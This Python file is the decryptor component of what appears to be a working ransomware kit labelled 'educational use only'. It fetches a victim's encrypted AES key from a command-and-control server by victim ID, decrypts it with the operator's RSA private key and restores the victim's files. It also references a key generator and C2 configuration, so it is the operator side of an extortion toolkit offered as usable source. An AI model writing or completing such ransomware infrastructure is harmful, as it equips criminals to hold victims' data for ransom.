"""
Ransomware Decryptor Tool
Educational Use Only
"""

import os
import sys
import base64
import requests
import argparse
from pathlib import Path

# Add parent directory to path to allow imports from config
sys.path.insert(0, str(Path(__file__).parent.parent))

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from config.settings import Config

class RansomwareDecryptor:
    def __init__(self, private_key_path, c2_server=None):
        self.config = Config()
        self.private_key = self.load_private_key(private_key_path)
        self.c2_server = c2_server or self.config.C2_SERVER
        
    def load_private_key(self, private_key_path):
        """Load RSA private key from file"""
        with open(private_key_path, "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )
        return private_key
    
    def decrypt_aes_key(self, encrypted_aes_key_b64):
        """Decrypt AES key using RSA private key"""
        encrypted_aes_key = base64.b64decode(encrypted_aes_key_b64)
        
        decrypted_key = self.private_key.decrypt(
            encrypted_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return decrypted_key
    
    def get_victim_key_from_c2(self, victim_id):
        """Retrieve encrypted AES key from C2 server"""
        try:
            print(f"[*] Contacting C2 server for victim {victim_id}...")
            response = requests.get(f"{self.c2_server}/get_key/{victim_id}")
            if response.status_code == 200:
                data = response.json()
                return data.get('encrypted_key')
            else:
                print(f"[-] Failed to get key: {response.json().get('error')}")
                return None
        except Exception as e:
            print(f"[-] Error contacting C2: {e}")
            return None
    
    def find_encrypted_files(self, start_path):
        """Find all encrypted files"""
        encrypted_files = []
        start_path = Path(start_path)
        
        for file_path in start_path.rglob(f"*{self.config.ENCRYPTION_EXTENSION}"):
            if file_path.is_file():
                encrypted_files.append(str(file_path))
        
        return encrypted_files
    
    def decrypt_file(self, file_path, aes_key):
        """Decrypt a single file"""
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            # Extract IV (first 16 bytes) and encrypted data
            iv = file_data[:16]
            encrypted_data = file_data[16:]
            
            cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
            decryptor = cipher.decryptor()
            decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
            
            # Write decrypted file (remove .encrypted extension)
            original_path = file_path.replace(self.config.ENCRYPTION_EXTENSION, '')
            with open(original_path, 'wb') as file:
                file.write(decrypted_data)
            
            # Remove encrypted file
            os.remove(file_path)
            print(f"[+] Decrypted: {os.path.basename(file_path)}")
            return True
            
        except Exception as e:
            print(f"[-] Error decrypting {file_path}: {str(e)}")
            return False
    
    def decrypt_filesystem(self, victim_id, start_path=None):
        """Main decryption routine"""
        print(f"[*] Starting decryption for victim: {victim_id}")
        
        # Get encrypted AES key from C2
        encrypted_key_b64 = self.get_victim_key_from_c2(victim_id)
        if not encrypted_key_b64:
            print("[-] Could not retrieve encryption key")
            return False
        
        # Decrypt AES key
        aes_key = self.decrypt_aes_key(encrypted_key_b64)
        print("[+] AES key decrypted successfully")
        
        # Determine target path
        if start_path:
            decrypt_path = start_path
        elif self.config.TEST_MODE:
            decrypt_path = self.config.TEST_DIRECTORY
        else:
            decrypt_path = os.path.expanduser("~")
        
        # Find and decrypt files
        encrypted_files = self.find_encrypted_files(decrypt_path)
        print(f"[*] Found {len(encrypted_files)} encrypted files")
        
        if not encrypted_files:
            print("[-] No encrypted files found!")
            return False
        
        decrypted_count = 0
        for file_path in encrypted_files:
            if self.decrypt_file(file_path, aes_key):
                decrypted_count += 1
        
        print(f"[+] Decryption completed. {decrypted_count} files restored.")
        return True

def main():
    """Command-line decryption tool"""
    parser = argparse.ArgumentParser(description='Ransomware Decryptor - Educational Use Only')
    parser.add_argument('victim_id', help='Victim ID to decrypt')
    parser.add_argument('--private-key', default='data/private_key.pem', 
                       help='Path to private key file (default: data/private_key.pem)')
    parser.add_argument('--path', help='Path to decrypt (default: auto-detect)')
    parser.add_argument('--c2-server', help='C2 server URL')
    
    args = parser.parse_args()
    
    print("=== RANSOMWARE DECRYPTOR ===")
    print("EDUCATIONAL USE ONLY")
    print()
    
    if not os.path.exists(args.private_key):
        print(f"[-] Private key file not found: {args.private_key}")
        print("[*] Generate keys first: python src/key_generator.py")
        return
    
    decryptor = RansomwareDecryptor(args.private_key, args.c2_server)
    success = decryptor.decrypt_filesystem(args.victim_id, args.path)
    
    if success:
        print("✅ Recovery completed successfully!")
    else:
        print("❌ Recovery failed!")

if __name__ == "__main__":
    main()